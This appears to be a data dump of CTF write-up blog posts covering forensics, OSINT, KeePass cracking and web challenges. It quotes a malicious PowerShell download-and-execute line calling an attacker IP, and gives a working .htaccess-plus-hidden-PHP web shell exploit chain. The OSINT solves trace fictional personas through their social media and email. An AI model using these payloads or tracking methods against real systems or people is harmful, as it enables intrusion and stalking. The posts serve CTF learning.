System.Net.WebClient).DownloadString(\\\u0026#34;http://172.21.20.96/windowsupdate.ps1\\\u0026#34;);IEX $e This can also be viewed on any.run when importing the file\nThis malicious command seems to have downloaded a file called windowsupdate.ps1. I searched this string in Autopsy, and found a command where a very long base64 string was downloaded from the Powershell logs. Decoding the b64 we an object that starts with:\n(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL \u0026#39; \u0026#39;, (\u0026#39;76492d111..) We can run this into a powershell emulator to get the following output:\n$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101); $bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66); $flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99); $s=\u0026#39;172.21.20.96:8080\u0026#39;;$i=\u0026#39;eef8efac-321d465e-e9d053a7\u0026#39;; $p=\u0026#39;http://\u0026#39;;$v=Invoke-Web... And there we see a $flag variable, signaling this is likely our flag. Running just that and printing we get a pastebin:\nAnd we get the flag! As well as the resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within\nflag: idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}\n","date":"24 January 2023","permalink":"/posts/idek-ctf-2022/","section":"Posts","summary":"\u003cp\u003e*Was in 2023, not 2022 since event delayed. Great CTF with a lot of challenges from the team \u003cstrong\u003eidek\u003c/strong\u003e ¯_(ツ)_/¯. My team WolvSec came in \u003cstrong\u003e17th\u003c/strong\u003e out of \u003cstrong\u003e846\u003c/strong\u003e teams. I will be going over my 2 Forensics solves and 5 OSINT. Currently just Forensics 1, I plan to add the rest later!\u003c/p\u003e","title":"idek CTF 2022"},{"content":"University of San Diego\u0026rsquo;s CTF! We placed 8th which is extremely good! I solved all the OSINT Challenges, which was not a small task for this CTF, and only left me a couple of hours to take a look at other challenges.\nPart of the ship\u0026hellip; [76 solves]\nGoogle Ransom [155 solves]\nSamuel [88 solves]\nTuring Test [49 solves]\nPaypal Playboy [23 solves]\nMann Hunt [96 solves]\nPart of the ship\u0026hellip; #Difficulty: Easy\nAuthors: Blarthogg\nPoints: 150\nSolves: 76\nChallenge Description:\nSometimes I worry about my friend\u0026hellip; he\u0026rsquo;s way too into memes, he\u0026rsquo;s always smiling, and he\u0026rsquo;s always spouting nonsense about some \u0026ldquo;forbidden app.\u0026rdquo; I don\u0026rsquo;t know what he\u0026rsquo;s talking about, but maybe you can help me figure it out! All I know is a username he used way back in the day. Good luck! Flag format is sdctf{flag}\nUsername\nDanFlashes\nApproach #I started off this challenge by looking up the username DanFlashes on different social media platforms to see if one was linked to SDCTF. I found one on Instagram, but it seemed unrelated to the competition. I went back to the prompt to see what other clues could lead us to this account. I decided to google “forbidden app” and found urban dictionary definitions that this app is iFunny, and the definitions also mentioned being “part of the ship” (like the challenge name) so I figured this was the right social media.\nLooking at DanFlashes on iFunny, we see that this page does not exist. However, the challenge description states that this was “‘way back’ in the day” which hints that we should use the Wayback Machine (always look for hints like these in OSINT challenges!). From this we can see a snapshot was taken January 28th of this year, which gives us the flag on DanFlashes\u0026rsquo; profile.\nflag: sdctf{morning_noon_and_night_I_meme}\nGoogle Ransom #Difficulty: Easy\nAuthors: KNOXDEV\nPoints: 100\nSolves: 155\nChallenge Description:\nOh no! A hacker has stolen a flag from us and is holding it ransom. Can you help us figure out who created this document? Find their email address and demand they return the flag!\nAttachments\nransom letter\nApproach #From the ransom letter, we see a cryptic note about someone threatening to sign their email up for an annoying newsletter. As threatening as this is, it doesn’t give us any information about who made this google doc. However, since it’s google there is likely a way to view the email of this account owner. I went to the “shared with me” section on google drive to get more information about the random letter. Looking at Details, we can see that the owner of the document is Amy SDCTF.\nI could have used GHunt to get the exact email, but from the Turing Test challenge I assumed the email was in the same format as jack.sdctf@gmail.com and confirmed this on epieos. After sending amy.sdctf@gmail.com an email demanding the flag, we get a response giving it to us.\nflag: sdctf{0p3n_S0uRCE_1S_aMaz1NG}\nSamuel #Difficulty: Medium\nAuthors: k3v1n\nPoints: 88\nSolves: 160\nChallenge Description:\nWhere is this? https://www.youtube.com/watch?v=fDGVF1fK1cA\nFlag format: sdctf{latitude,longitude} using decimal degrees and 3 decimal places rounded toward zero (Ex. 4.1239 → 4.123, -4.0009 → -4.000)\nExample: If the location were https://goo.gl/maps/TnhzfxXKg9TDYDfR9 the flag would be sdctf{38.889,-77.035}\nNote\nThe youtube channel/account is not relevant to this challenge. Only the video content is relevant.\nApproach #The video linked shows us a blinking beacon at night, with a plane flying by in the distance. I initially thought this was an Aviation OSINT since the plane in the background was the only other thing in the video. I had no idea how to use the beacon or distant plane.\nAs the competition progressed, I saw that the challenge had a lot of solves and I figured it likely wasn’t some insanely hard Aviation OSINT. I then realized the blinking beacon was likely morse code. .-- .... .- - / .... .- - .... / --. --- -.. / .-- .-. --- ..- --. .... - translated to WHAT HATH GOD WROUGHT. After googling what that means, we learn it was the official first Morse code message transmitted in the US.\nI thought then the location may be where the message was originally transferred or received, but couldn’t find anything there. I then just searched “What hath god wrought” on Google Maps and found a sculpture at the University of California San Diego. Seeing that the competition is hosted by San Diego State University, I assumed this was the right spot. From this we can get the coordinates on Google Maps in the url, and truncating 32.8751745,-117.2408527 to get the flag.\nflag: sdctf{32.875,-117.240}\nTuring Test #Difficulty: Medium\nAuthors: Blarthogg, KNOXDEV\nPoints: 200\nSolves: 49\nChallenge Description:\nMy friend has been locked out of his account! Can you help him recover it?\nEmail\njack.sdctf@gmail.com\nWebsite\nhttps://vault.sdc.tf/\nNote\nTwitter does not need to be used for this challenge.\nApproach #My first step in this challenge was going to the website, and started spamming random passwords to see what would happen. After 5 incorrect guesses, an Account Support window is prompted. We are then asked security questions to get back into our account (as well as bread puns).\nFor the first prompt, we are asked our name. We can use epieos on Jack’s email to find his name is Jack Banner.\nNext we are prompted with “What month were you born in?” I wasn\u0026rsquo;t sure if you were supposed to brute force this but figured since it was an OSINT challenge thre would be a social media account. Epieos showed Jack’s email as being connected to a Twitter, but luckily the challenge admin noticed this as well and added a disclaimer that twitter does not need to be used. What could have happened is someone else registered an account with that email, which admins have to be prepared to fix for these kinds of challenges. I tried other social media platforms, and specifically ones that I did not explore yet. OSINT categories usually try to avoid using the same platform twice. Looking up “Jack Banner” on Facebook, we see the account we are looking for.\nThe first post we can use to find his birthday by a quick google search of “99 days before april 19” giving us their birthday of January 10th.\nThe next prompt is “What is the name of your dog?” Looking around more on their facebook, we see an instagram for their dog linked in the Intro section. Something I learned from this challenge is that this can only be seen if you are logged into Facebook, so for some OSINT challenges you may need to be logged in. Although for regular OSINT gathering usually you don’t want to alert the person you are looking at, such as on LinkedIn. On the Instagram account we see that the dog’s name is Ravioli.\nThe final prompt is “What are the first six characters of your flag?” which is sdctf{ for this CTF. This lets us access the flag vault and get the flag.\nflag: sdctf{7he_1m1747i0n_94m3}\nPaypal Playboy #Difficulty: Hard\nAuthors: Blarthogg\nPoints: 300\nSolves: 23\nChallenge Description:\nWe\u0026rsquo;ve apprehended somebody suspected of purchasing SDCTF flags off an underground market. That said, this guy is small fry. We need to find the leaker and bring them to brutal justice!\nAttached is an email we retrieved from his inbox. See if you can\u0026rsquo;t figure out the boss of their operation.\nFlag format is sdctf{\u0026hellip;}\nmbox\nClick here to download\nNote\nYou should not have to spend any money to solve this challenge\nNote\nIf you encounter an email not in the format of [name].sdctf@gmail.com it is not in the challenge scope.\nApproach #The mbox file contains an email from flag.peddler@wehate.sdc.tf about \u0026ldquo;cheap sdctf banners\u0026rdquo;. I used epieos to see more information about that email, but it doesn\u0026rsquo;t exist. I then wanted to see what 支付.png (payment.png) was. Using a base64 to image converter, we get a qr code that leads to this Cash App.\nThe username on Cash App is limosheen. I first used Sherlock to look for accounts connected to that username but couldn’t find anything. I looked back at the email for more information that we could use to find limosheen.\nI decoded the plaintext section of the email with base64 and utf-8, then ran it through Google Translate:\nCheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. You can also find us on PayPal or on the blockchain. 0xbad ... A43B ..... SDCTF {Forgery_bana} 3️⃣ ✳ ✳️ 👟 📙 👈 🔠 🖖 🐾 🃏 🕕 ❇ ❇ ❇️ ⬇ 🈷️ 🕜 ↘️ 🍕 👨 🌏 ◾️ 🌎 😸 🍄 ✳️ 🕡 🚛 👧 🔻 ♓️ 🔠 😭\nThis note says we also find them on PayPal. When searching for limosheen on PayPal, we can see that there exists an account with the SDCTF logo. The challenge description said \u0026ldquo;You should not have to spend any money to solve this challenge\u0026rdquo;, although some people still sent the account money but received nothing :(. After some research I learned about paypal.me accounts which give more information about a user. Going to limosheen’s profile, we find this:\nI saw a string on this that started with 0x and incorrectly thought it was a hex string by default, and decoding it gave nothing. I eventually learned it was an Ethereum address by just googling and inputting the address into crypto websites. In hindsight I should have definitely realized this sooner with the plaintext saying we can also find them on the blockchain, and the ropETH comment on the PayPal. When looking up the address on Etherscan we find that the address is valid, but no entries are found.\nI thought that this was a dead end at first and started doing reverse image searches and forensics on the PayPal banner, but did not get any results. I looked back at the Ethereum address and figured there must be a reason that it’s there. On Etherscan there is a notification saying that the address can be found on other chains, and sure enough we see that it’s on the Ropsten Testnet.\nI tried googling the “ropETH” hint from the PayPal prior but must have done so poorly since I could not find Ropsten Testnet, but it at least confirmed we were in the right place now. We see Ethereum was transferred to 0x949213139D202115c8b878E8Af1F1D8949459f3f, and this address has only inbound transfers, so it can be assumed that this is the boss we are looking for.\nThe PayPal account said we could find the boss on Twitter, so I put this address into twitter and found the account Jon Fakeflag.\nFrom this account we get a base64 string that gives us the flag.\nflag: sdctf{You_Ever_Dance_With_the_Devil_In_the_Pale_Moonlight}\nMann Hunt #Difficulty: Hard\nAuthors: KNOXDEV\nPoints: 400\nSolves: 96\nChallenge Description:\nWe were on the trail of a notorious hacker earlier this week, but they suddenly went dark, taking down all of their internet presence\u0026hellip;All we have is a username. We need you to track down their personal email address! It will be in the form ****.sdctf@gmail.com. Once you find it, send them an email to demand the flag!\nUsername\nmann5549\nApproach #After a quick search for mann5549 we find that they have a Twitter.\nI tried using the Wayback Machine on this Twitter but could not find anything useful. I went to the website linked on Twitter where we find this message stating that we will never find this user.\nWayback Machine does not prove to be useful here either, so I looked at the source code of the website and found a link to a GitHub repository for the website.\n…name=\u0026#34;description\u0026#34; content=\u0026#34;Contribute to the blog at https://github.com/manncyber/manncodes.github.io\u0026#34;/\u0026gt;\u0026lt;meta data-react-helmet=\u0026#34;true\u0026#34; property=\u0026#34;og:title\u0026#34;... In this repository we can see a commit that manncyber made removing certain data because he was being tracked. My first thought was maybe they used their email in this commit, so I added .patch to the end of the commit url but they used a standard GitHub email for this.\nHere is where I started overthinking the challenge and tried a couple of dead end routes. I saw an image called salty_egg was removed in this commit, and when reverse image searvching it I was lead to this Wikipedia article. I spent a long time looking through the editing history profiles and IPs before realizing the image was a stock template for Gatsby.\nIn this commit history we can also see that the blog author’s name Emanuel Hunt was removed. I initially looked on epieos to see if emmanuel.sdctf@gmail.com or hunt.sdctf@gmail.com were valid emails, but they were not. I finally just googled “Emanuel Hunt” (which I should have done initially) and was immediatley shown a search result for an Emanuel Hunt from San Diego on LinkedIn.\nIf we go to the resume that is linked, the email is unfortunately blanked out. However, if we hover over Emanuel Hunt’s profile picture on the right hand side the email mann.sdctf@gmail.com is shown.\nThis email is fairly simple to guess and some people may have done that initially. Sending them an email demanding the flag we get this response:\nflag:sdctf{MaNN_tH@t_w@s_Ann0YinG}\n","date":"10 May 2022","permalink":"/posts/sd-ctf-2022/","section":"Posts","summary":"\u003cp\u003eUniversity of San Diego\u0026rsquo;s CTF! We placed \u003cstrong\u003e8th\u003c/strong\u003e which is extremely good! I solved all the OSINT Challenges, which was not a small task for this CTF, and only left me a couple of hours to take a look at other challenges.\u003c/p\u003e","title":"SD CTF 2022"},{"content":"Keeber OSINT Complete 1-8\nChallenge: Keeber #Category: OSINT\nDifficulty: Medium\nAuthors: @matlac#2291, @Gary#4657\nPoints: 1842\nKeeber 1 [1246 solves]\nKeeber 2 [890 solves]\nKeeber 3 [377 solves]\nKeeber 4 [192 solves]\nKeeber 5 [573 solves]\nKeeber 6 [164 solves]\nKeeber 7 [74 solves]\nKeeber 8 [62 solves]\nKeeber 1 #Points: 50\nSolves: 1246\nChallenge Description: You have been applying to entry-level cybersecurity jobs focused on reconnaissance and open source intelligence (OSINT). Great news! You got an interview with a small cybersecurity company; the Keeber Security Group. Before interviewing, they want to test your skills through a series of challenges oriented around investigating the Keeber Security Group.\nThe first step in your investigation is to find more information about the company itself. All we know is that the company is named Keeber Security Group and they are a cybersecurity startup. To start, help us find the person who registered their domain. The flag is in regular format.\nApproach #Starting off we get this prompt that the Keeber Security Group about them wanting us to perform an investigation on them using our OSINT knowledge. We see that someone registered a domain, so step 1 should be finding this website. Not too hard after a quick google search for Keeber Security Group.\nWe can use external websites to find out who registered the domain, such as whois.com.\nflag: flag{ef67b2243b195eba43c7dc797b75d75b}\nKeeber 2 #Points: 50\nSolves: 890\nChallenge Description: The Keeber Security Group is a new startup in its infant stages. The team is always changing and some people have left the company. The Keeber Security Group has been quick with changing their website to reflect these changes, but there must be some way to find ex-employees. Find an ex-employee through the group\u0026rsquo;s website. The flag is in regular format.\nApproach #I started off looking at the Github for this one, and found a contributor named Tiffany Douglas who wasn’t on the team section of the website. However, I couldn\u0026rsquo;t find the flag there. I then pivoted to the Wayback Machine and noticed a snapshot was taken prior to the competition starting.\nLooking at this, we can find the flag under Tiffany\u0026rsquo;s name in the team section.\nflag: flag{cddb59d78a6d50905340a62852e315c9}\nKeeber 3 #Points: 50\nSolves: 377\nChallenge Description: The ex-employee you found was fired for \u0026ldquo;committing a secret to public github repositories\u0026rdquo;. Find the committed secret, and use that to find confidential company information. The flag is in regular format.\nApproach #To find the committed secret, I turned to github to see if there were any commits by Tiffany that were undone. Under the .gitignore in security-evaluation-workflow we see a secret that Tiffany must have added by mistake.\nI wasn’t sure what asana was at first, but after googling it seems that it’s some software that Keeber uses. I went to the asana documentation to see what we could do with this and came across a way to access the api:\ncurl https://app.asana.com/api/1.0/users/me \\ -H \u0026#34;Authorization: Bearer 0/a7f89e98g007e0s07da763a\u0026#34; Replacing the string with the one in the github, we get the flag.\nflag: flag{49305a2a9dcc503cb2b1fdeef8a7ac04}\nKeeber 4 #Points: 318\nSolves: 192\nChallenge Description: The ex-employee also left the company password database exposed to the public through GitHub. Since the password is shared throughout the company, it must be easy for employees to remember. The password used to encrypt the database is a single lowercase word somehow relating to the company. Make a custom word list using the Keeber Security Groups public facing information, and use it to open the password database The flag is in regular format.\n(Hint: John the Ripper may have support for cracking .kdbx password hashes!)\nApproach #Finding the password database wasn\u0026rsquo;t hard, as it\u0026rsquo;s under password-manager in the github. After some research, we find that the .kdbx extension is a Keepass database hash. Following the steps in this github we can crack this keepass using John the Ripper and Hashcat together. With keepass2john in John the Ripper we can get a hash file that is readable by hashcat. You must remove the file name from the start of the hash file by editing it or with | grep -o \u0026quot;$keepass$.*\u0026quot;.\nThe hardest part for me in this challenge was creating a good word list to use. I initially used CeWL to compile a list of words on the website and github, then turned them to lowercase and removed duplicates. The correct password was in here, but the wordlist was 30k+ words and hashcat would not have finished in time.\nI looked closer at the security-evaluation-workflow in the github and found a lot of strange words that did not exist like in “We strive to achieve minivivi and clainebookahl through this”. I figured one of these made up words would be the password, and compiled a wordlist of the 72 of them. Using hashcat, we get the password is craccurrelss in 4 mins, 35 seconds.\nUsing Keepass, we can open the .kdbx file with craccurrelss and get access to the passwords. After messing around for a bit I found that performing auto-type on an entry outputs the flag.\nflag: flag{9a59bc85ebf02d5694d4b517143efba6}\nKeeber 5 #Points: 50\nSolves: 573\nChallenge Description: The ex-employee in focus made other mistakes while using the company\u0026rsquo;s GitHub. All employees were supposed to commit code using the keeber-@protonmail.com email assigned to them. They made some commits without following this practice. Find the personal email of this employee through GitHub. The flag is in regular format.\nApproach #The challenge description tells us that we should look in the company’s GitHub to find the email of Tiffany. My initial thought is that she may have made a commit on another public GitHub repo. However, the Keeber repository is the only public one she has made commits to.\nI then did some research to see if there was a way to get the email of an account through GitHub and came across this article. Following these steps, I went through each of Tiffany’s commits in the GitHub repo adding .patch to all of the urls. Eventually, we get to this commit and get the following output when adding .patch:\nFrom b25ed7f5aa72f88c0145a3832012546360c2ffc2 Mon Sep 17 00:00:00 2001 From: flag{2c90416c24a91a9e1eb18168697e8ff5} \u0026lt;tif.hearts.science@gmail.com\u0026gt; Date: Wed, 20 Apr 2022 22:46:09 -0400 Subject: [PATCH] started code_reviews.txt --- code_reviews.txt | 16 ++++++++++++++++ 1 file changed, 16 insertions(+) ... flag: flag{2c90416c24a91a9e1eb18168697e8ff5}\nKeeber 6 #Points: 368\nSolves: 164\nChallenge Description: After all of the damage the ex-employee\u0026rsquo;s mistakes caused to the company, the Keeber Security Group is suing them for negligence! In order to file a proper lawsuit, we need to know where they are so someone can go and serve them. Can you find the ex-employee’s new workplace? The flag is in regular format, and can be found in a recent yelp review of their new workplace.\n(Hint: You will need to pivot off of the email found in the past challenge!)\nApproach #The hint tells us that we need to use tif.hearts.science@gmail.com to eventually find this new workplace. I tried to use epieos to get more information. This only gives us her name and that she has a GitHub account, which we already knew. Since we are trying to find their new workplace, I figured they may have a social media account that would allow us to find this place (similar to a recent OSINT I made for WolvSecCon). Linkedin produced no results, and I thought Instagram was not either. None of the Tiffany Douglas accounts on instagram seemed to be her, but searching tif.hearts.science we find an account that is hers.\nI started with this first post to find her work location. We can see a Google watermark on it, so I set out to find where this could be on Google Maps. On Tiffany\u0026rsquo;s GitHub profile, she states that she is from Maine. This can also be deduced from the 207 area code on Keeber\u0026rsquo;s website. Searching on the coast of Google Maps, we can easily see ferry routes denoted by blue dashed lines. I eliminated the minor cities in Maine and figured it must be Portland, which would also be why she called it “the city.”\nAfter scanning these ports I eventually came across this one that looked like the image, and sure enough if we turn the date back to 2015 we see the same image that was on her instagram.\nFrom her first instagram post I see that there is a courtyard at the place she works at, so I start scanning for courtyards in Portland on Google Maps to see if any of them had similar photospheres. This was not getting me anywhere, so I looked more at her Instagram and figured she works at a hotel from the “but the pool is indoors” meme. In hindsight, the bedding Instagram posts were also indications of this. I searched for hotels in Portland and found one with a courtyard in satellite mode.\nSearching this hotel on yelp, we find Tiffany’s review with the flag in it.\nflag: flag{0d707179f4c993c5eb3ba9becfb046034}\nKeeber 7 #Points: 474\nSolves: 74\nChallenge Description: Multiple employees have gotten strange phishing emails from the same phishing scheme. Use the email corresponding to the phishing email to find the true identity of the scammer. The flag is in regular format.\n(Note: This challenge can be solved without paying for anything!)\nkeeber_7.pdf\nApproach #Thankfully, Princess of the Ugbo Kingdom Ayofemi Akinruntan’s valiant attempt to get Keeber to donate to him and Sir. Beiber did not trick them. However, they did leave their email cheerios.fanatic1941@gmail.com which we may be able to use to figure out whoever sent this.\nI thought about doing forensics work on the pdf, but since this was an OSINT challenge and the description said use the email I didn’t bother doing anything past looking at the metadata, to which there was nothing. The note saying we did not need to pay for any OSINT tool hinted that we should be able to use a public one, so I went back to epieos. This gave us the information that this gmail is registered with the name Issac Anderson and with holehe we know that they have a Myspace account created with this email.\nI looked for a while to see if there was a way to find a Myspace account with just an email, but could not find anything. I then searched for Issac Anderson on Myspace and checked the ones that showed up but did not see a flag. I thought for a bit that maybe holehe was wrong or someone else registered an account with that email, but looking at the pdf again I figured the mention of Justin Bieber was a hint that we should in fact be looking for a Myspace account, since people like to share music there. I then realized I did not look through all the Issac Andersons, of which many, many results showed up.\nI went through opening all of them and quickly looked through to see if I found the right one. Sure enough, the flag showed up on one of them.\nflag: flag{4a7e2fcd7f85a315a3914197c8a20f0d}\nKeeber 8 #Points: 482\nSolves: 62\nChallenge Description: Despite all of the time we spend teaching people about phishing, someone at Keeber fell for one! Maria responded to the email and sent some of her personal information. Pivot off of what you found in the previous challenge to find where Maria\u0026rsquo;s personal information was posted. The flag is in regular format.\nApproach #From the Myspace account in Keeber 7 the url leaves us with their username cereal_lover1990. The Sherlock tool is great for finding accounts connected to usernames.\nA lot of the results that showed up like CapFriendly show up for most searches but don’t actually have an account linked to that username. However, Pastebin doesn’t normally show up, and that seems like a great place to post personal information. Going to the Chump list on their pastebin, we can find the flag in Maria’s personal information.\nflag: flag{70b5a5d461d8a9c5529a66fa018ba0d0}\nSeems like we’re ready for that interview now ;)\n","date":"1 May 2022","permalink":"/posts/nahamcon-ctf-2022/","section":"Posts","summary":"\u003cp\u003eKeeber OSINT Complete 1-8\u003c/p\u003e","title":"Nahamcon CTF 2022"},{"content":"","date":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web"},{"content":"Author writeups for my 6 individual challenges\nArt-Contest # Challenge Description #Submit your best ascii art to win!\nhttps://art-contest-974780027560.us-east5.run.app\nSolve #File Details #Users are given this site\nAnd index.php which contains the following PHP before the HTML\n\u0026lt;?php session_start(); $session_id = session_id(); $target_dir = \u0026#34;/var/www/html/uploads/$session_id/\u0026#34;; // Creating the session-specific upload directory if it doesn\u0026#39;t exist if (!is_dir($target_dir)) { mkdir($target_dir, 0755, true); chown($target_dir, \u0026#39;www-data\u0026#39;); chgrp($target_dir, \u0026#39;www-data\u0026#39;); } ?\u0026gt; And after\n\u0026lt;?php if (isset($_FILES[\u0026#39;fileToUpload\u0026#39;])) { $target_file = basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $session_id = session_id(); $target_dir = \u0026#34;/var/www/html/uploads/$session_id/\u0026#34;; $target_file_path = $target_dir . $target_file; $uploadOk = 1; $lastDotPosition = strrpos($target_file, \u0026#39;.\u0026#39;); // Check if file already exists if (file_exists($target_file_path)) { echo \u0026#34;Sorry, file already exists.\\n\u0026#34;; $uploadOk = 0; } // Check file size if ($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 50000) { echo \u0026#34;Sorry, your file is too large.\\n\u0026#34;; $uploadOk = 0; } // If the file contains no dot, evaluate just the filename if ($lastDotPosition == false) { $filename = substr($target_file, 0, $lastDotPosition); $extension = \u0026#39;\u0026#39;; } else { $filename = substr($target_file, 0, $lastDotPosition); $extension = substr($target_file, $lastDotPosition + 1); } // Ensure that the extension is a txt file if ($extension !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; $extension !== \u0026#39;txt\u0026#39;) { echo \u0026#34;Sorry, only .txt extensions are allowed.\\n\u0026#34;; $uploadOk = 0; } if (!(preg_match(\u0026#39;/^[a-f0-9]{32}$/\u0026#39;, $session_id))) { echo \u0026#34;Sorry, that is not a valid session ID.\\n\u0026#34;; $uploadOk = 0; } // Check if $uploadOk is set to 0 by an error if ($uploadOk == 0) { echo \u0026#34;Sorry, your file was not uploaded.\\n\u0026#34;; } else { // If everything is ok, try to upload the file if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file_path)) { echo \u0026#34;The file \u0026#34; . htmlspecialchars(basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])) . \u0026#34; has been uploaded.\u0026#34;; } else { echo \u0026#34;Sorry, there was an error uploading your file.\u0026#34;; } } $old_path = getcwd(); chdir($target_dir); // make unreadable - the proper way shell_exec(\u0026#39;chmod -- 000 *\u0026#39;); chdir($old_path); } ?\u0026gt; And the Dockerfile:\nFROM php:8.4-apache # Install cron RUN apt-get update \u0026amp;\u0026amp; apt-get install -y cron \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* # Copy the index page COPY index.php /var/www/html/index.php # Create the uploads directory and make it unreadable but writeable RUN mkdir -p /var/www/html/uploads \u0026amp;\u0026amp; \\ chown root:www-data /var/www/html/uploads \u0026amp;\u0026amp; \\ chmod 730 /var/www/html/uploads # Make /var/www/html/ only readable RUN chown root:www-data /var/www/html/ \u0026amp;\u0026amp; \\ chmod 750 /var/www/html/ # Copy flag.txt over COPY flag.txt /var/www/html/flag.txt RUN chown root:root /var/www/html/flag.txt \u0026amp;\u0026amp; \\ chmod 400 /var/www/html/flag.txt # Copy get_flag over and compile COPY get_flag.c /var/www/html/get_flag.c RUN gcc /var/www/html/get_flag.c -o /var/www/html/get_flag \u0026amp;\u0026amp; \\ chown root:www-data /var/www/html/get_flag \u0026amp;\u0026amp; \\ chmod 4755 /var/www/html/get_flag \u0026amp;\u0026amp; \\ rm /var/www/html/get_flag.c # Create a cron job to delete uploads every hour, we can review them fast enough RUN echo \u0026#34;0 * * * * root find /var/www/html/uploads -type f -delete\u0026#34; \u0026gt; /etc/cron.d/delete-uploads RUN chmod 0644 /etc/cron.d/delete-uploads RUN crontab /etc/cron.d/delete-uploads # Start apache and cron CMD bash -c \u0026#34;cron \u0026amp;\u0026amp; apache2-foreground\u0026#34; Step 1 #In index.php there is the following:\n// Get the extention by getting everyting past the last \u0026#39;.\u0026#39; last ($lastDotPosition == false) { $filename = substr($target_file, 0, $lastDotPosition); $extension = \u0026#39;\u0026#39;; } else { $filename = substr($target_file, 0, $lastDotPosition); $extension = substr($target_file, $lastDotPosition + 1); } Since there is a loose comparison (== instead of ===), this means if the last dot position is 0, this will evaluate to try and the extension will be empty. therefore, hidden files do not count as an extension\nStep 2 #// Ensure that the extention is a txt file if ( $extension !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; $extension !== \u0026#39;txt\u0026#39;) { echo \u0026#34;Sorry, only .txt extensions are allowed\u0026#34;; $uploadOk = 0; } As long as our file does not contain an extension, it can be uploaded. this includes .htaccess files. an .htaccess file can be uploaded that contains the following to allow .txt files to execute as php:\nAddType application/x-httpd-php .txt Step 3 #$old_path = getcwd(); chdir($target_dir); // make unreadable - the proper way shell_exec(\u0026#39;chmod -- 000 *\u0026#39;); chdir($old_path); Due to the \u0026ndash; in the chmod command, an attacker can not upload file such as --reference=file.txt. However, since they changed the .htaccess file to execute commands as php, they can upload a hidden file that will not get hit by the chmod --- 000 * command. This may be hard to notice, since the .htaccess is forbidden by default. .call_get_flag.txt can be uploaded containing the following:\n\u0026lt;?php echo(shell_exec(\u0026#39;/var/www/html/get_flag 2\u0026gt;\u0026amp;1\u0026#39;)); ?\u0026gt; Step 4 #An attacker needs to go into their cookies on the browser and grab PHPSESSID. Then they can navigate to the following URL (example PHPSESSID:fb14797cfe048e2eab6f43d87ba82592)\nafter uploading the .htaccess file and .backdoor.txt, an attacker can navigate to the following:\nhttps://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag.txt\nThey will get this error:\nError opening file: No such file or directory Step 5 #After reading the source file of get_flag.c, or downloading the file by navigating to https://art-contest-974780027560.us-east5.run.app/get_flag and testing it, the attacker realizes they need to execute the SUID binary in the diretory /var/www/html since it is reading ./flag.txt, not /var/www/html/flag.txt. they can create another file and upload it named .call_get_flag_in_dir.txt:\n\u0026lt;?php chdir(\u0026#39;/var/www/html\u0026#39;); echo(shell_exec(\u0026#39;./get_flag\u0026#39;)); ?\u0026gt; https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag_in_dir.txt\nwctf{m1ss3d_m3_chm0d_:3} Lost 2 # Challenge Description #My other friend Johnny is somehow\u0026hellip;worse. All I know is he is in the US, nothing else. He messaged me in January of this year saying \u0026ldquo;My flight took off just over a day and 2 hours late due to weather this SUCKS I could have driven there and back soooo many times by now\u0026rdquo; and \u0026ldquo;Sorry meant to send that last month lol airplane mode :PPP\u0026rdquo;\nThere\u0026rsquo;s no shot of finding him right? If you do pls send the flight number using the IATA code not ICAO thanks (Flag format: wctf{XX####})\nSolve #Check the government website for databases to get the full set of data (since you can\u0026rsquo;t just input one airport): https://www.transtats.bts.gov/DataIndex.asp\nEventually make your way to the Marketing Carrier On-Time Performance and filter by December 2024: https://www.transtats.bts.gov/DL_SelectFields.aspx?gnoyr_VQ=FGK\u0026QO_fu146_anzr=b0-gvzr\nThis will show specific details about US based flights, such as departure delays\nNeed to select the following:\nIATA_Code_Marketing_Airline\tFlight_Number_Marketing_Airline OriginCityName DestCityName DepDelay WeatherDelay The first two are to get the flight number for the flag, the city names are so we can confirm they are close to each other (from the message saying he could have driven back and forth several times), the departure delay to confirm it\u0026rsquo;s around 26 hours late, and weather delay to confirm the delay is due to weather.\nOpen in excel or other editor and sort WeatherDelay: Confirmation using flight radar that on December 24, the flight was delayed ~26 hours:\nPasswords #![[Pasted_image_20250324180345.png]]\nChallenge Description #Solve #┌──(kali㉿kali)-[~/ctf/Passwords] └─$ keepass2john Database.kdbx \u0026gt; keepass.hash ┌──(kali㉿kali)-[~/ctf/Passwords] └─$ keepass2john Database.kdbx Database:$keepass$*2*6000*0*5bd85bff1c654df5d8cb8f64b877ea179b66978615917c39faf6edd98444928b*dec1f1a8a46d2257b1c536800ccea618d15523c983162f1a760d0f0e3f32bed6*02dc62f9e295c9a256e4e231b3102c1a*8ed6478291ac58151a98e7465f10a11e8cafc1706d048ef4f94fe51453f091bc*193dd9a5673c4a3f5b33dd59639f27760f03285044f14eacc652f4a441b45413 ┌──(kali㉿kali)-[~/ctf/Passwords] └─$ keepass2john Database.kdbx \u0026gt; keepass.hash ┌──(kali㉿kali)-[~/ctf/Passwords] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 6000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes 